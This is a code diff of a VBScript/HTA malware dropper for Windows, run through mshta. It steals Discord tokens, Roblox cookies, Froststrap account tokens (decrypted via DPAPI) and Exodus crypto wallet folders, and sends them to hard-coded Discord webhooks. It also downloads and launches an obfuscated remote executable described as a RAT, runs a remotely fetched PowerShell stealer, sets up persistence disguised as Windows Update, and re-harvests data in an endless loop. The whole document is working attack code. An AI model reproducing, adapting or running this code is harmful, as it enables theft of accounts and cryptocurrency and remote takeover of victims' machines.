@@ -1,7 +1,4 @@
 ' language: VBScript/HTA, file: dropper.html, target: Windows 11, mshta engine
-' Removed PostFullRobloxUI entirely.
-' Removed seed.seco and passphrase.json uploads.
-' Exodus now only zips the folder and sends the UI with password status.
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
@@ -13,26 +10,25 @@ Dim sh, fso, WH, RE_WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- WEBHOOKS ---
+' LOGS WEBHOOK
 WH = "https://discord.com/api/webhooks/1572026403560357978/n4qVnwrF6-OKw6vRfm73KZNXc-8X3IVSkOgQcfRb35d92LOEujl6OMvBy3GpPWrsXdQN"
+' RE-GRAB WEBHOOK
 RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py18HaoCznPd3rfi411OUUewgpFL9Sfx7JGM7qYRtNtXU3vkHh5r"
-
-EXODUS_PAYLOAD_URL = "https://your-domain.com/seed.seco" 
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- 1. GRABS ---
+' --- 1. GRABS (LOGS CHANNEL) ---
 Call IP(WH)
 Call GrabTokens(WH)
-Call GrabRoblox(WH)
-Call GrabExodus(RE_WH)
 Call Persistence
+Call GrabExodus(WH)
+Call SendEmojiUI(WH)
 
-' --- 2. RAT DROP ---
-Call DropRAT(RE_WH, "First Run")
+' --- 2. RAT DROP (LOGS CHANNEL) ---
+Call DropRAT(WH, True)
 
-' --- 3. INFINITE Re-grab chain ---
+' --- 3. INFINITE Re-grab chain (RE-GRAB CHANNEL) ---
 Dim runCount
 runCount = 0
 Do
@@ -41,23 +37,37 @@ Do
     
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
-    Call GrabRoblox(RE_WH)
+    Call SendEmojiUI(RE_WH)
     Call GrabFroststrap(RE_WH)
-    Call GrabExodus(RE_WH)
     
-    Call DropRAT(RE_WH, "Re-grab " & runCount)
+    Call DropRAT(RE_WH, False)
     
     Call SleepSeconds(150)
 Loop
 
 window.close()
 
+' --- SEND UI WITH EMOJIS ---
+Sub SendEmojiUI(targetWH)
+    Dim cookie : cookie = GetRobloxCookie()
+    If Len(cookie) < 50 Then Exit Sub
+    
+    Dim desc : desc = "🔴 **Password:** dreistuff" & vbCrLf & vbCrLf & _
+                      "🎮 **Cookie:**" & vbCrLf & "``" & cookie & "``"
+                      
+    Call PostEmbedTo("👤 Roblox Account UI", desc, 10181046, targetWH)
+End Sub
+
 ' --- EXODUS STEALER (ZIPPED) ---
 Sub GrabExodus(targetWH)
     Dim base : base = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Exodus\exodus.wallet"
     Dim passFile : passFile = base & "\passphrase.json"
+    Dim pStatus : pStatus = "No Password"
     
-    If Not fso.FolderExists(base) Then Exit Sub
+    If fso.FileExists(passFile) Then pStatus = "Password Protected"
+    If Not fso.FolderExists(base) Then
+        Exit Sub
+    End If
 
     Dim zipPath : zipPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\exodus_wallet.zip"
     If fso.FileExists(zipPath) Then fso.DeleteFile zipPath, True
@@ -66,46 +76,29 @@ Sub GrabExodus(targetWH)
     sh.Run zipCmd, 0, True
 
     If fso.FileExists(zipPath) Then
-        Dim pStatus : pStatus = "False (No Password)"
-        If fso.FileExists(passFile) Then pStatus = "True (Password Protected)"
-        
         Dim sizeMB : sizeMB = Round(fso.GetFile(zipPath).Size / 1048576, 2)
         
-        ' Send the UI + file via curl to bypass VBScript limits
-        Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
-        Dim DQ: DQ = Chr(34)
+        Dim desc : desc = "💼 **Exodus Wallet Found**" & vbCrLf
+        desc = desc & "🔑 **Password:** " & pStatus & vbCrLf
+        desc = desc & "📦 **Size:** " & sizeMB & " MB"
         
-        Dim payloadTxt : payloadTxt = "{" & DQ & "content" & DQ & ": " & DQ & ":briefcase: **Exodus Wallet Captured**`n**Password:** " & pStatus & "`n**Size:** " & sizeMB & " MB" & DQ & "}"
-        
-        Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "payload_json" & DQ & vbCrLf & vbCrLf & payloadTxt & vbCrLf & _
-                        "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & "exodus_wallet.zip" & DQ & vbCrLf & vbCrLf & ReadFile(zipPath) & vbCrLf & "--" & b & "--"
-        
-        Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-        h.SetOption 2, 13056
-        h.Open "POST", targetWH, False
-        h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
-        h.Send bd
-        Set h = Nothing
-
+        Call PostEmbedTo("🔐 Exodus Wallet", desc, 10181046, targetWH)
+        Call PostFileTo("exodus_wallet.zip", ReadFile(zipPath), targetWH, "")
         fso.DeleteFile zipPath, True
-    End If
-
-    ' Swap seed if no password
-    Dim seedFile : seedFile = base & "\seed.seco"
-    If Not fso.FileExists(passFile) Then
-        Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -o """ & seedFile & """ """ & EXODUS_PAYLOAD_URL & """"
-        sh.Run dlCmd, 0, True
     End If
 End Sub
 
 ' --- RAT DROP ---
-Sub DropRAT(targetWH, phase)
+Sub DropRAT(targetWH, sendRocket)
     Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
     Dim dl : dl = DecodeB64(b64Url)
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
-    Dim op : op = tPath & "\" & Chr(97) & Chr(103) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
+    Dim op : op = tPath & "\agent.exe"
+    
+    If sendRocket Then
+        Call PostEmbedTo("🚀 RAT Download", "Downloading...", 10181046, targetWH)
+    End If
 
-    Call PostEmbedTo(":rocket: RAT Download", "Downloading...", 10181046, targetWH)
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
     Dim cCmd : cCmd = "cmd /c curl.exe -s -L -o """ & op & """ """ & dl & """"
@@ -113,17 +106,10 @@ Sub DropRAT(targetWH, phase)
 
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 3000000 Then
-            Dim cookieTxt : cookieTxt = GetRobloxCookie()
             Dim desc : desc = "RAT launched successfully"
-            If Len(cookieTxt) > 0 Then
-                If Len(cookieTxt) > 3000 Then cookieTxt = Left(cookieTxt, 3000) & "..."
-                desc = desc & vbCrLf & vbCrLf & "**Cookie:**" & vbCrLf & "``" & cookieTxt & "``"
-            End If
-            Call PostEmbedTo(":white_check_mark: RAT Downloaded", desc, 10181046, targetWH)
+            Call PostEmbedTo("✅ RAT Downloaded", desc, 10181046, targetWH)
             Call RunCmd("""" & op & """")
         End If
-    Else
-        Call PostEmbedTo(":rocket: RAT Download", "Retry — file missing", 10181046, targetWH)
     End If
 End Sub
 
@@ -237,17 +223,8 @@ Sub IP(targetWH)
     If xh.Status <> 200 Then Exit Sub
     Dim ll : ll = Split(xh.responseText, vbLf)
     Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
-    Call PostEmbedTo(":dart: Target", info, 10181046, targetWH)
+    Call PostEmbedTo("🎯 Target", info, 10181046, targetWH)
     Set xh = Nothing
-End Sub
-
-' --- GrabRoblox Function ---
-Sub GrabRoblox(targetWH)
-    Dim cookie : cookie = GetRobloxCookie()
-    If Len(cookie) = 0 Then Exit Sub
-
-    PostEmbedTo "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 10181046, targetWH
-    PostFileTo "cookie.txt", cookie, targetWH
 End Sub
 
 ' --- GrabFroststrap Function ---
@@ -261,11 +238,9 @@ Sub GrabFroststrap(targetWH)
     End If
     If Not fso.FileExists(fp) Then Exit Sub
 
-    Call PostEmbedTo(":snowflake: Froststrap", "Froststrap found, grabbing accounts...", 10181046, targetWH)
-
+    Call PostEmbedTo("❄️ Froststrap", "Froststrap found, grabbing accounts...", 10181046, targetWH)
     Dim ps
-    ps = "$w='" & targetWH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=10181046})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
-
+    ps = "$w='" & targetWH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title='❄️ Froststrap Accounts';description=$desc;color=10181046})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
@@ -287,24 +262,17 @@ Sub SleepSeconds(s)
     End If
 End Sub
 
-Sub SleepMinutes(m)
-    Call SleepSeconds(m * 60)
-End Sub
-
 ' --- Persistence ---
 Sub Persistence()
     Dim payload : payload = "mshta https://dicerigx.app/"
     On Error Resume Next
-    
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
-    
     Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
     Dim sf : Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
     sf.Close
-    
-    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
+    Call PostEmbed("📌 Persistence", "3 startup methods installed", 10181046)
 End Sub
 
 ' --- GrabTokens ---
@@ -317,16 +285,13 @@ Sub GrabTokens(targetWH)
     Dim pc: pc = xh.responseText
     If Len(pc) < 100 Then Exit Sub
     Set xh = Nothing
-    
     Dim psf: psf = TmpFile("steal.ps1")
     WriteFile psf, pc
     sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
     fso.DeleteFile psf, True
-    
     Dim tf: tf = TmpFile("steal_result.txt")
     If Not fso.FileExists(tf) Then Exit Sub
     Dim raw: raw = ReadFile(tf)
-    
     If Len(raw) > 10 Then
         Dim lines: lines = Split(raw, vbCrLf)
         Dim l
@@ -340,11 +305,11 @@ Sub GrabTokens(targetWH)
                         If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                         If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                         info = info & "**Token:** " & p(4)
-                        Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
+                        Call PostEmbedTo("🎁 Discord Token", info, 10181046, targetWH)
                     End If
                 End If
                 If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
-                    Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 10181046, targetWH)
+                    Call PostEmbedTo("🍪 Roblox Cookie", Mid(l, 8), 10181046, targetWH)
                 End If
             End If
         Next
@@ -361,7 +326,6 @@ Sub PostEmbed(t, d, c)
     Call PostEmbedTo(t, d, c, WH)
 End Sub
 
-' --- PostEmbedTo ---
 Sub PostEmbedTo(t, d, c, target_wh)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
@@ -374,10 +338,14 @@ Sub PostEmbedTo(t, d, c, target_wh)
 End Sub
 
 ' --- PostFileTo ---
-Sub PostFileTo(fn, ct, target_wh)
+Sub PostFileTo(fn, ct, target_wh, desc)
     Dim DQ: DQ = Chr(34)
     Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
-    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
+    
+    Dim payloadTxt : payloadTxt = "{" & DQ & "content" & DQ & ": " & DQ & Ej(desc) & DQ & "}"
+    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "payload_json" & DQ & vbCrLf & vbCrLf & payloadTxt & vbCrLf & _
+                    "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
+    
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", target_wh, False
